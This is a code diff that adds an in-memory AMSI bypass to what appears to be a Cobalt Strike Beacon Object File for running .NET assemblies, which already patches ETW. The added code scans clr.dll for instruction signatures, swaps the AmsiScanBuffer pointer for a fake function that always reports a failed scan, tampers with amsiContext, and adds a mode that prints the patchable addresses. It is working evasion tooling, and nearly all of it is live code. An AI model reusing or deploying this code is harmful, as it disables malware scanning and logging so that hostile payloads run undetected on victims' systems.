@@ -19,6 +19,11 @@ typedef HWND (WINAPI *_GetConsoleWindow)(VOID);
 typedef BOOL (WINAPI *_ShowWindow)(HWND, int);
 typedef BOOL (WINAPI *_FreeConsole)(VOID);
 typedef DWORD (WINAPI *_GetTickCount)(VOID);
+typedef HMODULE (WINAPI *_LoadLibraryA)(LPCSTR lpLibFileName);
+typedef DWORD (WINAPI *_GetModuleFileNameA)(HMODULE, LPSTR, DWORD);
+typedef DWORD (WINAPI *_GetFileVersionInfoSizeA)(LPCSTR, LPDWORD);
+typedef BOOL (WINAPI *_GetFileVersionInfoA)(LPCSTR, DWORD, DWORD, LPVOID);
+typedef BOOL (WINAPI *_VerQueryValueA)(LPCVOID, LPCSTR, LPVOID, PUINT);
 
 // MSVCRT function declarations
 DECLSPEC_IMPORT int __cdecl MSVCRT$_wcsicmp(const wchar_t*, const wchar_t*);
@@ -691,6 +696,218 @@ void turnOnEtwEnableBits(int* enableBitsAddr, int enableBitsVal) {
     *enableBitsAddr = enableBitsVal;
 }
 
+int isCallGetProcAddress(unsigned char* addr, void* getProcAddress_addr) {
+    // match "call"
+    if (addr[0] != 0xff || addr[1] != 0x15) {
+        return 0; 
+    }
+
+    int iatOffset = *(DWORD*)(addr + 2);
+    unsigned char* rip = addr + 6;
+    unsigned char* iatAddress = (rip + iatOffset);
+
+    // match "cs:__imp_GetProcAddress"
+    if (*(DWORD**)iatAddress != getProcAddress_addr) {
+        return 0;
+    }
+
+    return 1;
+}
+
+int isLeaAmsiScanBuffer(unsigned char* addr) {
+    // lea  rdx, aAmsiinitialize ; "AmsiInitialize"
+    if (addr[0] != 0x48 || addr[1] != 0x8d || addr[2] != 0x15) {
+        return 0;
+    }
+
+    unsigned char* rip = addr + 7;
+    int offset = *(DWORD*)(addr + 3);
+    char* string = rip + offset;
+
+    if (MSVCRT$strcmp("AmsiScanBuffer", string) != 0) {
+        return 0;
+    }
+
+    return 1;
+}
+
+int isMovAmsiScanBufferGlobal(unsigned char* addr) {
+    // mov cs:?AmsiScanBuffer, <r64>
+    return addr[0] == 0x48 && addr[1] == 0x89;
+}
+
+int isMovAmsiContext(unsigned char* addr) {
+    // mov <r64>, cs:?g_amsiContext
+    return addr[0] == 0x48 && addr[1] == 0x8b;
+}
+
+int fakeAmsiScanBuffer() {
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] fakeAmsiScanBuffer called\n");
+    return 1; // fake a "scan failed"
+}
+
+int findAmsiGlobals(long long* p_AmsiScanBufferGlobal, long long* p_amsiContext, size_t verbose) {
+    int SEARCH_MAX_BYTES = 20;
+
+    void* clrBase = getImageBase(L"clr.dll");
+    int clrSize = getImageSize(clrBase);
+
+    HMODULE kernel32 = LoadLibraryA("kernel32.dll");
+    void* getProcAddress_addr = GetProcAddress(kernel32, "GetProcAddress");
+
+    for (int i = 0; i < clrSize; i++) {
+        unsigned char* addr = (unsigned char*)clrBase + i;
+
+        if (!isLeaAmsiScanBuffer(addr)) {
+            continue;
+        }
+
+        if (verbose) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Found \"lea rdx, aAmsiScanBuffer\" at %p\n", addr);
+        }
+        addr += 7;
+
+        // checks the next 20 bytes for this signature
+        // call cs:__imp_GetProcAddress
+        for (int i = 0; i < SEARCH_MAX_BYTES; i++) {
+            if (isCallGetProcAddress(addr, getProcAddress_addr)) {
+                break;
+            }
+            if (i == SEARCH_MAX_BYTES - 1) {
+                return 0;
+            }
+            addr += 1;
+        }
+
+        if (verbose) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Found \"call cs:__imp_GetProcAddress\" at %p\n", addr);
+        }
+        addr += 6;
+
+        // checks the next 20 bytes for this signature
+        // mov cs:?AmsiInitialize, <r64>
+        for (int i = 0; i < SEARCH_MAX_BYTES; i++) {
+            if (isMovAmsiScanBufferGlobal(addr)) {
+                break;
+            }
+            if (i == SEARCH_MAX_BYTES - 1) {
+                return 0;
+            }
+            addr += 1;
+        }
+
+        if (verbose) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Suspected \"mov  cs:?AmsiScanBuffer, <r64>\" at %p\n", addr);
+        }
+        // printf("%p: %x %x %x\n", addr, addr[0], addr[1], addr[2]);
+
+        unsigned char* rip = addr + 7;
+        int offset = *(int*)(addr + 3);
+        *p_AmsiScanBufferGlobal = (long long)(rip + offset);
+
+        addr += 7;
+        for (int i = 0; i < SEARCH_MAX_BYTES; i++) {
+            if (isMovAmsiContext(addr)) {
+                break;
+            }
+            if (i == SEARCH_MAX_BYTES - 1) {
+                return 0;
+            }
+            addr += 1;
+        }
+
+        if (verbose) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Suspected \"mov <r64>, cs:?g_amsiContext\" at %p\n", addr);
+        }
+
+        rip = addr + 7;
+        offset = *(int*)(addr + 3);
+        *p_amsiContext = (long long)(rip + offset);
+
+        return 1;
+    }
+
+    return 0;
+}
+
+void turnOffAmsi(long long p_AmsiScanBufferGlobal, long long p_amsiContext, long long* p_savedAmsiScanBuffer, long long* p_savedAmsiContext) {
+    *p_savedAmsiScanBuffer = *(long long*)p_AmsiScanBufferGlobal;
+    *p_savedAmsiContext = *(long long*)p_amsiContext;
+
+    *(long long*)p_AmsiScanBufferGlobal = (long long)fakeAmsiScanBuffer;
+    *(long long*)p_amsiContext = 1;
+}
+
+void turnOnAmsi(long long p_AmsiScanBufferGlobal, long long p_amsiContext, long long p_savedAmsiScanBuffer, long long p_savedAmsiContext) {
+    *(long long*)p_AmsiScanBufferGlobal = p_savedAmsiScanBuffer;
+    *(long long*)p_amsiContext = p_savedAmsiContext;
+}
+
+void printClrVersion(HMODULE clrBase) {
+    HMODULE kernel32Base = getImageBase(L"KERNEL32.DLL");
+    _LoadLibraryA loadLibraryA = (_LoadLibraryA)getProcAddr(kernel32Base, "LoadLibraryA");
+    _GetModuleFileNameA getModuleFileNameA = (_GetModuleFileNameA)getProcAddr(kernel32Base, "GetModuleFileNameA");
+
+    char clrPath[512] = {0};
+    int len = getModuleFileNameA(clrBase, clrPath, (DWORD)sizeof(clrPath));
+
+    HMODULE hVersion = loadLibraryA("version.dll");
+
+    _GetFileVersionInfoSizeA getFileVersionInfoSizeA = (_GetFileVersionInfoSizeA)getProcAddr(hVersion, "GetFileVersionInfoSizeA");
+    DWORD dummy = 0;
+    DWORD verSize = getFileVersionInfoSizeA(clrPath, &dummy);
+    void *verData = MSVCRT$malloc(verSize);
+
+    _GetFileVersionInfoA getFileVersionInfoA = (_GetFileVersionInfoA)getProcAddr(hVersion, "GetFileVersionInfoA");
+    getFileVersionInfoA(clrPath, 0, verSize, verData);
+
+    VS_FIXEDFILEINFO *pInfo = NULL;
+    UINT infoLen = 0;
+    _VerQueryValueA verQueryValueA = (_VerQueryValueA)getProcAddr(hVersion, "VerQueryValueA");
+    verQueryValueA(verData, "\\", (LPVOID*)&pInfo, &infoLen);
+
+    DWORD ms = pInfo->dwFileVersionMS;
+    DWORD ls = pInfo->dwFileVersionLS;
+    DWORD major = HIWORD(ms);
+    DWORD minor = LOWORD(ms);
+    DWORD build = HIWORD(ls);
+    DWORD revision = LOWORD(ls);
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] clr.dll path: %s\n", clrPath);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] clr.dll build: %u.%u.%u.%u\n", major, minor, build, revision);
+}
+
+// display all patchable addresses and clr version
+void doScan() {
+    HMODULE clrBase = getImageBase(L"clr.dll");
+    if (clrBase == NULL) {
+        HMODULE kernel32Base = getImageBase(L"KERNEL32.DLL");
+        _LoadLibraryA loadLibraryA = (_LoadLibraryA)getProcAddr(kernel32Base, "LoadLibraryA");
+        clrBase = loadLibraryA("clr.dll");
+
+        if (clrBase == NULL) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Unable to load clr.dll - Exiting\n");
+            return;
+        }
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] clr.dll loaded: %p\n", clrBase);
+
+    printClrVersion(clrBase);
+
+    int* handleAddr = findDotNetRuntimeHandle();
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeHandle address: %p\n", handleAddr);
+
+    int* enableBitsAddr = findDotNETRuntimeEnableBits();
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeEnableBits address: %p\n", enableBitsAddr);
+
+    long long p_AmsiScanBufferGlobal = 0;
+    long long p_amsiContext = 0;
+    findAmsiGlobals(&p_AmsiScanBufferGlobal, &p_amsiContext, 0);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] AmsiScanBufferGlobal address: %p\n", p_AmsiScanBufferGlobal);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] amsiContext address: %p\n", p_amsiContext);
+}   
+
 void go(char *args, int len) {
     // parse arguments
     datap parser;
@@ -700,7 +917,14 @@ void go(char *args, int len) {
     char* assemblyArgs = BeaconDataExtract(&parser, NULL);
     size_t patchEtwHandle = BeaconDataInt(&parser);
     size_t patchEtwEnableBits = BeaconDataInt(&parser);
+    size_t patchAmsi = BeaconDataInt(&parser);
     size_t verbose = BeaconDataInt(&parser);
+    size_t scan = BeaconDataInt(&parser);
+
+    if (scan) {
+        doScan();
+        return;
+    }
 
     if (assemblyLength == 0) {
         return;
@@ -719,10 +943,15 @@ void go(char *args, int len) {
         return;
     }
 
+    if (verbose) {
+        HMODULE clrBase = getImageBase(L"clr.dll");
+        printClrVersion(clrBase);
+    }
+
     // provider handle patching
     int* handleAddr; 
     int handleVal;
-    if (patchEtwHandle) {
+    if (patchAmsi && patchEtwHandle) {
         handleAddr = findDotNetRuntimeHandle();
         turnOffEtwHandle(handleAddr, &handleVal);
 
@@ -732,8 +961,8 @@ void go(char *args, int len) {
             BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeHandle patched: %x\n", *handleAddr);
         }
     }
-
     
+    // enable bits patching
     int* enableBitsAddr;
     int enableBitsVal;
     if (patchEtwEnableBits) {
@@ -747,12 +976,36 @@ void go(char *args, int len) {
         }
     }
 
+    // load amsi.dll first to pre-patch the dll
+    // HMODULE amsiBase = NULL;
+    // if (patchAmsi) {
+    //     _LoadLibraryA loadLibraryA = (_LoadLibraryA)getProcAddr(kernel32Base, "LoadLibraryA");
+    //     amsiBase = loadLibraryA("amsi.dll");
+    //     if (verbose && amsiBase) {
+    //         BeaconPrintf(CALLBACK_OUTPUT, "[+] amsi.dll loaded: %p\n", amsiBase);
+    //     } else if (verbose) {
+    //         BeaconPrintf(CALLBACK_OUTPUT, "[+] amsi.dll not loaded\n");
+    //     }
+    // }
 
-    if (verbose) {
-        HMODULE clrBase = getImageBase(L"clr.dll");
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] clr.dll loaded: %p\n", clrBase);
+    // amsi patching
+    long long p_AmsiScanBufferGlobal = 0;
+    long long p_amsiContext = 0;
+    long long p_savedAmsiScanBuffer;
+    long long p_savedAmsiContext;
+    if (patchAmsi && findAmsiGlobals(&p_AmsiScanBufferGlobal, &p_amsiContext, verbose)) {
+        turnOffAmsi(p_AmsiScanBufferGlobal, p_amsiContext, &p_savedAmsiScanBuffer, &p_savedAmsiContext);
+        if (verbose) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] AmsiScanBufferGlobal address: %p\n", p_AmsiScanBufferGlobal);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] AmsiScanBufferGlobal value: %p\n", p_savedAmsiScanBuffer);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] AmsiScanBufferGlobal patched: %p (fakeAmsiScanBuffer)\n", *(long long*)p_AmsiScanBufferGlobal);
+
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] amsiContext address: %p\n", p_amsiContext);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] amsiContext value: %p\n", p_savedAmsiContext);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] amsiContext patched: %p\n", *(long long*)p_amsiContext);
+        }
     }
-
+    
     // create pipes
     HANDLE hReadPipe = NULL;
     HANDLE hWritePipe = NULL;
@@ -834,6 +1087,15 @@ void go(char *args, int len) {
         
         if (verbose) {
             BeaconPrintf(CALLBACK_OUTPUT, "[+] DotNETRuntimeEnableBits value restored: %x\n", *enableBitsAddr);
+        }
+    }
+	
+	// restore p_amsiContext and p_AmsiScanBufferGlobal
+    if (patchAmsi && p_AmsiScanBufferGlobal && p_amsiContext) {
+        turnOnAmsi(p_AmsiScanBufferGlobal, p_amsiContext, p_savedAmsiScanBuffer, p_savedAmsiContext);
+        if (verbose) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] AmsiScanBufferGlobal value restored: %p\n", *(long long*)p_AmsiScanBufferGlobal);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] amsiContext value restored: %p\n", *(long long*)p_amsiContext);
         }
     }
 
